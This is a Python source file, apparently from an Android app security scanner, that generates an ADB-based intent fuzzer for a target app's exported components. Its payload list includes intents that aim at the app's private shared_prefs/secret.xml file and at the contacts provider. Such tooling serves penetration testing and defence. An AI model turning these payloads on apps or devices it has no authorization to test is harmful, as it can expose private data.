"""
IntentFuzzerGenerator v1.0
--------------------------
Generates a standalone Python script to actively fuzz the target app's
exported components via ADB. It takes the exported components found by
IntentHijackingAnalyzer and creates ready-to-run PoC exploit code.
"""
import os

class IntentFuzzerGenerator:
    def __init__(self, apk_meta: dict, findings: dict):
        self.package = apk_meta.get("package", "com.target.app")
        self.findings = findings

    def generate(self, output_dir: str):
        icc_data = self.findings.get("IntentHijacking", {})
        components = icc_data.get("exported_components", [])
        
        if not components:
            return None
            
        script_path = f"{output_dir}_fuzzer.py"
        
        # Build the script content
        content = f"""#!/usr/bin/env python3
\"\"\"
Auto-Generated Intent Fuzzer for {self.package}
Run this script while a device/emulator is connected via ADB.
\"\"\"
import subprocess
import time

PACKAGE = "{self.package}"

COMPONENTS = [
"""
        for comp in components:
            if isinstance(comp, dict):
                comp_type = comp.get("type", "activity")
                comp_name = comp.get("name", "")
            else:
                comp_type = "component"
                comp_name = str(comp)
            content += f"    ('{comp_type}', '{comp_name}'),\n"
            
        content += """]

PAYLOADS = [
    # Null action
    "",
    # Standard view
    "-a android.intent.action.VIEW",
    # Typical exploit intents with null data
    "-a android.intent.action.VIEW -d 'file:///data/data/{}/shared_prefs/secret.xml'",
    "-a android.intent.action.VIEW -d 'content://com.android.contacts/contacts'",
    # Deep links fuzzing
    "-a android.intent.action.VIEW -d 'app://test'",
]

def run_adb(cmd):
    try:
        res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
        return res.stdout.strip() + res.stderr.strip()
    except Exception as e:
        return str(e)

def fuzz():
    print(f"[*] Starting fuzzer for {PACKAGE}...")
    print(f"[*] Checking ADB...")
    if not run_adb("adb devices").strip():
        print("[!] No ADB devices found.")
        return

    for c_type, c_name in COMPONENTS:
        print(f"\\n[+] Fuzzing {c_type.upper()}: {c_name}")
        for payload in PAYLOADS:
            if "{}" in payload:
                payload = payload.format(PACKAGE)
            
            if c_type == "activity":
                cmd = f"adb shell am start -n {PACKAGE}/{c_name} {payload}"
            elif c_type == "service":
                cmd = f"adb shell am startservice -n {PACKAGE}/{c_name} {payload}"
            elif c_type == "receiver":
                cmd = f"adb shell am broadcast -n {PACKAGE}/{c_name} {payload}"
            else:
                continue
                
            print(f"  [>] {cmd}")
            output = run_adb(cmd)
            if "Error" in output or "Exception" in output:
                print(f"  [!] CRASH or ERROR: {output.splitlines()[0]}")
            time.sleep(1)

if __name__ == '__main__':
    fuzz()
"""
        with open(script_path, "w", encoding="utf-8") as f:
            f.write(content)
            
        # Make executable
        try:
            os.chmod(script_path, 0o755)
        except Exception:
            pass
            
        return script_path
